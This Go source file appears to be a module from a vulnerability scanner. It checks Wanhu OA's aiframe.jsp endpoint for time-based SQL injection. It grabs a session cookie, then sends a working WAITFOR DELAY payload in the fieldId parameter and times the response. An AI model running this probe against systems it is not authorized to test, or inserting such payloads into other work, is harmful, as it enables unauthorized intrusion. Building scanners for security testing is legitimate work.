package wanhu_aiframe_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"regexp"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(15 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	// 发送第一个请求获取 Set-Cookie
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(url + "/defaultroot/login.jsp")
	if err != nil || resp.StatusCode != 200 {
		return false
	}

	// 提取 Set-Cookie 中的 OASESSIONID 值
	cookieRegex := regexp.MustCompile(`Set-Cookie: OASESSIONID=([A-F0-9]+);`)
	matches := cookieRegex.FindStringSubmatch(resp.Header.Get("Set-Cookie"))
	if len(matches) < 2 {
		return false // 未找到OASESSIONID
	}
	oasessionID := matches[1]

	// 使用提取的OASESSIONID发送带有SQL注入测试的请求
	vulnUrl := url + "/defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1;WAITFOR%20DELAY%20'0:0:5'--"
	startTime := time.Now()
	resp, err = client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
			"Cookie":     "OASESSIONID=" + oasessionID,
		}).
		Get(vulnUrl)
	responseTime := time.Since(startTime)

	// 检查响应时间是否符合注入逻辑
	if err == nil && resp.StatusCode == 200 && responseTime > 5*time.Second {
		return true
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		vulnerableUrl := url + "/defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1;WAITFOR%20DELAY%20'0:0:5'--"
		color.Green.Println("[+10] 万户OA aiframe.jsp SQL注入漏洞漏洞 -> ", vulnerableUrl)
	} else {
		color.Red.Println("[-10] 万户OA aiframe.jsp SQL注入漏洞不存在")
	}
}
